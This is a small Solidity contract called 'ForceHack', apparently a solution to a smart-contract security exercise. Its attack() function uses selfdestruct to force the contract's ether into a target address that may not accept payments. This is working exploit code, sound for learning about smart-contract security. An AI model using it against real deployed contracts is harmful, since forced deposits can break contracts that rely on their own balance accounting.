// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract ForceHack {
    address payable public force;

    constructor (address payable _addr) {
        force = _addr;
    }

    function attack() public {
        selfdestruct(force);
    }

    fallback() payable external {

    }
}